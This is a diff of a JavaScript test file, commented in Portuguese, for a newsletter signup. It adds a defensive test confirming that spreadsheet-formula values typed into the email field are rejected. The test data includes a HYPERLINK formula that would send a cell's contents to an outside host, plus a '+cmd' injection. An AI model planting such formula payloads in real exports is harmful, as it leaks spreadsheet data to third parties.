@@ -27,7 +27,8 @@
  * │ • a newsletter e a caixa da conta como listas separadas (o e-mail      │
  * │   repetido, o cliente sem o link pra ficha);                           │
  * │ • o "Tirar" que não tira dos dois lugares, ou que leva o WhatsApp      │
- * │   junto; o CSV sem a lista;                                            │
+ * │   junto; o CSV sem a lista; a fórmula de planilha entrando no lugar do │
+ * │   e-mail;                                                              │
  * │ • rolagem de lado no celular; erro no console;                         │
  * │ • (CRM, parte 3) a ficha sem as cinco etiquetas, ou com elas pra       │
  * │   operação; o número do pedido chegando pro marketing; a oferta do     │
@@ -167,6 +168,16 @@ try {
     inscricoes.every((s) => s === 200),
     "o Bruno e o Leo na newsletter do rodapé",
     inscricoes.join(" ")
+  )
+  // A "fórmula" no lugar do e-mail: é assim que a lista vira planilha e a planilha roda o que não devia.
+  const formulas = [
+    await inscrever(`=HYPERLINK("http://x.com?q="&A1,"oi")@x.com`),
+    await inscrever(`+cmd${Date.now()}@x.com`),
+  ]
+  ok(
+    formulas.every((s) => s === 400),
+    "a fórmula de planilha no lugar do e-mail não entra na newsletter",
+    formulas.join(" ")
   )
   const caio = await clienteDoEmail(CAIO)
   const agora = new Date().toISOString()
